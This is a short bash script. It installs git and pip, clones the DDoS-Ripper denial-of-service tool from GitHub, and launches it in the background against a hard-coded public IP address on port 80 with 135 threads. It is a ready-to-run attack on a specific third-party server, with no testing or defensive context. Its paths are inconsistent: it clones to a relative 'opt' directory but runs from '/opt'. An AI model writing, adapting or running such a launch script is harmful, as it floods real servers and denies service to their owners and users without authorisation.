#!/bin/bash
sudo apt update && \
sudo apt install git -y && \
sudo apt install python3-pip -y && \
sudo git clone https://github.com/palahsu/DDoS-Ripper.git opt/DDoS-Ripper && \
chmod +x /opt/DDoS-Ripper/DRipper.py && \
sudo python3 /opt/DDoS-Ripper/DRipper.py -s 185.15.158.121 -p 80 -t 135 &